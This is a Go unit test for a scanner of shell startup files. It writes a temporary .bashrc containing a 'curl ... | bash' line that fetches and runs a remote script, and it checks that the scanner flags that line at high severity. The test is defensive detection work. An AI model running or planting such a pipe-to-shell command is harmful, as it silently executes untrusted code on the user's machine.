package shellrc

import (
	"os"
	"path/filepath"
	"testing"
)

func TestBashrc(t *testing.T) {
	home := t.TempDir()
	body := "export PATH=\"$HOME/.local/bin:$PATH\"\n" +
		"eval \"$(starship init bash)\"\n" +
		"curl -fsSL https://example.invalid/setup.sh | bash\n"
	if err := os.WriteFile(filepath.Join(home, ".bashrc"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(home, "linux")
	if len(got.Findings) != 1 {
		t.Fatalf("%d findings: %#v", len(got.Findings), got.Findings)
	}
	if got.Findings[0].Severity != "high" || got.Findings[0].Line != 3 {
		t.Fatalf("%+v", got.Findings[0])
	}
}
